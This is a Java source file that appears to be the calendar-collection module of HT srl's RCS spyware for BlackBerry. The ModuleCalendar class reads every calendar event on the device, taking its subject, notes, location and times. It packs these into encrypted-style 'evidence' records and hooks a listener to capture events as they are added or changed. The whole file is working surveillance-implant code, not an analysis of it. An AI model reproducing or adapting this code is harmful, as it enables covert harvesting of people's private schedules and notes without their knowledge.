//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.module;

import java.util.Date;
import java.util.Enumeration;

import javax.microedition.pim.Event;
import javax.microedition.pim.EventList;
import javax.microedition.pim.PIM;
import javax.microedition.pim.PIMException;
import javax.microedition.pim.PIMItem;

import net.rim.blackberry.api.pdap.BlackBerryEvent;
import net.rim.blackberry.api.pdap.BlackBerryPIMList;
import net.rim.blackberry.api.pdap.PIMListListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.config.ConfModule;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.Markup;
import blackberry.fs.Path;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class ModuleCalendar extends BaseModule implements PIMListListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ModCalendar", DebugLevel.VERBOSE);
    //#endif

    private static final int POOM_STRING_SUBJECT = 0x01000000;
    private static final int POOM_STRING_CATEGORIES = 0x02000000;
    private static final int POOM_STRING_BODY = 0x04000000;
    private static final int POOM_STRING_RECIPIENTS = 0x08000000;
    private static final int POOM_STRING_LOCATION = 0x10000000;
    private static final int POOM_OBJECT_RECUR = 0x80000000;

    final int version = 0x01000000;
    Markup markup;
    protected static final int SLEEPTIME = 3000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    public static String getStaticType() {
        return Messages.getString("19.0"); //"calendar";
    }

    public boolean parse(ConfModule conf) {
        markup = new Markup(this);

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: add listener");
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {
            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
                    PIM.READ_ONLY);
            list.addListener(this);
        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: remove listener");
        //#endif

        final PIM pim = PIM.getInstance();
        BlackBerryPIMList list;
        try {

            list = (BlackBerryPIMList) pim.openPIMList(PIM.EVENT_LIST,
                    PIM.READ_ONLY);
            list.removeListener(this);
        } catch (final PIMException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    public void actualLoop() {
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif
        //#ifdef DEBUG
        debug.trace("actualRun");
        //#endif

        if (!markup.isMarkup()) {
            //#ifdef DEBUG
            debug.trace("actualRun: getting Contact List");
            //#endif

            if (getCalendarList()) {
                //#ifdef DEBUG
                debug.trace("actualRun: need to write markup");
                //#endif
                markup.createEmptyMarkup();
            }
        }
    }

    private boolean getCalendarList() {
        EventList calendarList;
        int number = 0;

        String[] lists = PIM.getInstance().listPIMLists(PIM.EVENT_LIST);
        //#ifdef DEBUG
        debug.trace("actualRun lists: " + lists.length);
        //#endif

        boolean ret = true;

        for (int i = 0; i < lists.length; i++) {
            try {
                String name = lists[i];
                //#ifdef DEBUG
                debug.trace("actualRun: opening " + name);
                //#endif
                calendarList = (EventList) PIM.getInstance().openPIMList(
                        PIM.EVENT_LIST, PIM.READ_ONLY, name);

                number = saveEventEvidence(calendarList);
                //#ifdef DEBUG
                debug.trace("actualRun: saved " + number);
                //#endif

            } catch (final PIMException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif

                ret = false;
            }
        }
        return ret;

    }

    private int saveEventEvidence(EventList eventList) throws PIMException {
        final Enumeration eEvents = eventList.items();

        //#ifdef DEBUG
        debug.trace("saveEventEvidence: got calendar");
        //#endif
        Evidence evidence = new Evidence(EvidenceType.CALENDAR);
        evidence.createEvidence();

        BlackBerryEvent event;
        int number = 0;
        while (eEvents.hasMoreElements()) {
            //#ifdef DEBUG
            debug.trace("saveEventEvidence: event #" + ++number);
            //#endif
            try {
                event = (BlackBerryEvent) eEvents.nextElement();
                final byte[] packet = getEventPacket(eventList, event);
                evidence.writeEvidence(packet);
            } catch (final Exception ex) {
                //#ifdef DEBUG
                debug.error(ex);
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("saveEventEvidence: finished events. Total: " + number);
        //#endif
        evidence.close();

        return number;
    }

    private byte[] getEventPacket(EventList events, BlackBerryEvent event) {
        String summary = null, location = null, note = null;
        Date start = null, end = null, revision;
        int alarm, classEvent;
        int uid = 0;

        String uidEvent = getCalendarStringField(events, event, Event.UID);
        uid = Encryption.CRC32(uidEvent.getBytes());

        summary = getCalendarStringField(events, event, Event.SUMMARY);
        location = getCalendarStringField(events, event, Event.LOCATION);
        note = getCalendarStringField(events, event, Event.NOTE);

        long startLong = getCalendarDateField(events, event, Event.START);
        start = new Date(startLong);

        long endLong = getCalendarDateField(events, event, Event.END);
        end = new Date(endLong);

        long revisionLong = getCalendarDateField(events, event, Event.REVISION);
        revision = new Date(revisionLong);

        final DataBuffer dbPayload = new DataBuffer(false);

        dbPayload.writeInt(0);
        dbPayload.writeInt(version);
        dbPayload.writeInt(uid);

        int flags = 0;
        int sensitivity = 0;
        int busy = 2;
        int duration = 0;
        int meeting = 0;

        dbPayload.writeInt(flags);
        dbPayload.writeLong(DateTime.getFiledate(start));
        dbPayload.writeLong(DateTime.getFiledate(end));
        dbPayload.writeInt(sensitivity);
        dbPayload.writeInt(busy);
        dbPayload.writeInt(duration);
        dbPayload.writeInt(meeting);

        appendCalendarString(dbPayload, POOM_STRING_SUBJECT, summary);
        appendCalendarString(dbPayload, POOM_STRING_BODY, note);
        appendCalendarString(dbPayload, POOM_STRING_LOCATION, location);

        //#ifdef DEBUG
        debug.trace("getEventPacket: Adding " + summary + " body: " + note
                + " location: " + location);
        //#endif

        int size = dbPayload.getLength();
        //dbPayload.trim(true);

        dbPayload.rewind();
        dbPayload.writeInt(size);

        byte[] packet = dbPayload.toArray();

        //#ifdef DEBUG
        debug.trace("packet: " + Utils.byteArrayToHex(packet));
        //#endif                

        return packet;
    }

    private long getCalendarDateField(EventList events, BlackBerryEvent event,
            int type) {
        long ret = 0;
        try {
            if (events.isSupportedField(type)) {
                ret = event.getDate(type, PIMItem.ATTR_NONE);
                //#ifdef DEBUG
                debug.trace("getCalendarDateField: " + ret);
                //#endif
            }
        } catch (IndexOutOfBoundsException ex) {
            //#ifdef DEBUG
            debug.error("getCalendarStringField: " + ex);
            //#endif
        }

        return ret;
    }

    private String getCalendarStringField(EventList events,
            BlackBerryEvent event, int type) {
        String ret = null;
        try {
            if (events.isSupportedField(type)) {
                ret = event.getString(type, PIMItem.ATTR_NONE);
                //#ifdef DEBUG
                debug.trace("getCalendarStringField: " + ret);
                //#endif
            }
        } catch (IndexOutOfBoundsException ex) {
            //#ifdef DEBUG
            debug.error("getCalendarStringField: " + ex + " type: " + type);
            //#endif
        }

        return ret;
    }

    private void appendCalendarString(DataBuffer payload, int type,
            String message) {
        if (message != null) {
            byte[] data = WChar.getBytes(message, false);
            int len = type | (data.length & 0x00ffffff);
            byte[] prefix = Utils.intToByteArray(len);
            payload.write(prefix);
            payload.write(data);
        }
    }

    private void save(Event item) {
        try {

            final EventList eventList = (EventList) item.getPIMList();
            final BlackBerryEvent event = (BlackBerryEvent) item;
            final byte[] payload = getEventPacket(eventList, event);

            Evidence evidence = new Evidence(EvidenceType.CALENDAR);
            evidence.atomicWriteOnce(payload);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }
    }

    public void itemAdded(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.trace("itemAdded: " + item);
        //#endif
        save((Event) item);
    }

    public void itemRemoved(PIMItem item) {
        init();
        //#ifdef DEBUG
        debug.trace("itemRemoved: " + item);
        //#endif
    }

    public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
        init();
        //#ifdef DEBUG
        debug.trace("itemUpdated: " + itemNew);
        //#endif

        save((Event) itemNew);
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
